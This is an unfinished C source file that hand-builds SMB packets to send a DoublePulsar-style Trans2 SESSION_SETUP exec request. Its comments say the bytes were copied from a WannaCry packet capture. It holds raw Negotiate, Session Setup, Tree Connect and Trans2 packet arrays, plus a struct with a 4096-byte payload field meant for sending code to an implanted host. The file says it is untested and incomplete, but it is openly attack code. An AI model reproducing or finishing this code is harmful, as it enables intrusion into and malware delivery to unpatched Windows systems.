#define _CRT_SECURE_NO_WARNINGS
/*
WARNING: This code is NOT finished and WILL NOT work as of August 4 2020

2021 UPDATE: CODE UPDATED on 16/3/2021 but not tested yet

*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock.h>
#pragma comment(lib,"wsock32.lib")

unsigned char SmbNegociate[] =
"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x88\x05\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54"
"\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00";

unsigned char Session_Setup_AndX_Request[] =
"\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\xff\xff\x88\x05\x00\x00\x00\x00\x0d\xff\x00\x00\x00\xff"
"\xff\x02\x00\x88\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x01\x00\x00\x00\x0b\x00\x00\x00\x6e\x74\x00\x70\x79\x73\x6d"
"\x62\x00";

/* 
unsigned char TreeConnect_AndX_Request[] =
"\x00\x00\x00\x58\xff\x53\x4d\x42\x75\x00"
"\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\xff\xfe\x00\x08\x00\x03\x04\xff\x00\x58\x00\x08"
"\x00\x01\x00\x2d\x00\x00\x5c\x00\x5c\x00\x31\x00\x37\x00\x32\x00"
"\x2e\x00\x32\x00\x32\x00\x2e\x00\x35\x00\x2e\x00\x34\x00\x36\x00"
"\x5c\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00\x3f\x3f\x3f\x3f"
"\x3f\x00";*/
unsigned char SMB_TreeConnectAndX[] =
"\x00\x00\x00\x5A\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x08\x30\x00\x04\xFF\x00\x5A\x00\x08\x00\x01\x00\x2F\x00\x00";

unsigned char SMB_TreeConnectAndX_[] = "\x00\x00\x3F\x3F\x3F\x3F\x3F\x00";


//Fixed Trans2 session setup PING packet.  This should work
unsigned char trans2_request[] = 
"\x00\x00\x00\x4E\xFF\x53\x4D\x42\x32\x00\x00\x00\x00\x18\x07\xC0"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE"
"\x00\x08\x41\x00\x0F\x0C\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
"\x00\xA6\xD9\xA4\x00\x00\x00\x0C\x00\x42\x00\x00\x00\x4E\x00\x01"
"\x00\x0E\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00";

//Trans2 session setup EXEC(C8 or \x25\x89\x1a\x00) request found in Wannacry
unsigned char wannacry_Trans2_Request[] = 
"\x00\x00\x10\x4e\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x18\x07\xc0"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe"
"\x00\x08\x42\x00\x0f\x0c\x00\x00\x10\x01\x00\x00\x00\x00\x00\x00"
"\x00\x25\x89\x1a\x00\x00\x00\x0c\x00\x42\x00\x00\x10\x4e\x00\x01"
"\x00\x0e\x00\x0d\x10\x00"; /* d1 c9 10 17 d9 aa 40 17 d9 da 69 17 ( Example SESSION_SETUP Parameters ) */

/*
Copied from Wannacry PCAP:

Wannacry Trans2 Request, SESSION_SETUP 
00 00 10 4e ff 53 4d 42 32 00 00 00 00 18 07 c0
00 00 00 00 00 00 00 00 00 00 00 00 00 08 ff fe
00 08 42 00 0f 0c 00 00 10 01 00 00 00 00 00 00
00 25 89 1a 00 00 00 0c 00 42 00 00 10 4e 00 01
00 0e 00 0d 10 00 

SESSION_SETUP Parameters:
d1 c9 10 17 d9 aa 40 17 d9 da 69 17
*/

typedef struct {
	uint16 SmbMessageType; //0x00
	uint16 SmbMessageLength; 
	uint8 ProtocolHeader[4]; //"\xffSMB"
	uint8 SmbCommand; 
	uint32 NtStatus; //0x00000000
	uint8 flags; //0x18 - pathnames not case sensitive & pathnames canonicalized
	uint16 flags2;  //0xC007
	uint16 ProcessIDHigh; //0x00
	uint8 signature[8]; //0x00000000000
	uint16 reserved; //0x0000
	uint16 TreeId; 
	uint16 ProccessID; //0xfeff
	uint16 UserID; 
	uint16 multipleID;

	uint8 WordCount;
	uint16 TotalParameterCount;
	uint16 TotalDataCount;
	uint16 MaxParameterCount;
	uint16 MaxDataCount;
	uint8 MaxSetupCount;
	uint8 reserved;
	uint16 flags;
	uint32 timeout;   // 0x25 0x89 0x1a 0x00
	uint16 reserved2;
	uint16 ParameterCount;
	uint16 ParameterOffset;
	uint16 DataCount; //4096
	uint16 DataOffset; //78
	uint8 SetupCount; 
	uint8 reserved3;
	uint16 Function; //0x0e00 also known as Subcommand in Wireshark
	uint16 ByteCount; //4109 or 0x0d 0x10
	uint8 padding;
	//uint8 TransactionName[14]; 
	//uint16 padding2;
	char SESSION_DATA_PARAMETERS[12]; //Wannacry uses 12 as the size
	char payload[4096];
} SMB_COM_TRANSACTION2_STRUCT;

/*
	Sample SESSION_SETUP parameter values:
	42 30 80 57 42 d0 d0 57 42 d0 e6 57

	SMB_COM_TRANSACTION2_STRUCT trans2;
	trans2.SmbCommand = 0x32;
	trans2.Flags1 = 0x18;
	trans2.Flags2 = 0xc007;
	trans2.WordCount = 14 + setup_count; 
	trans2.TreeID = treeid; //extracted earlier
	trans2.multipleid  = 41;
	trans2.ParamCountTotal = param.length;
	trans2.DataCountTotal = bodyCount; //Count of the whole data being sent
	trans2.ParamCountMax = 1;
	trans2.DataCountMax = 0;
	trans2.ParamCount = param.length;
	trans2.ParamOffset = param_offset;
	trans2.DataCount = lpbdata.dwSize;
	trans2.DataOffset = data_offset;
	trans2.SetupCount = setup_count;
	trans2.SetupData = setup_data;
	trans2.timeout = 0x25891a00;
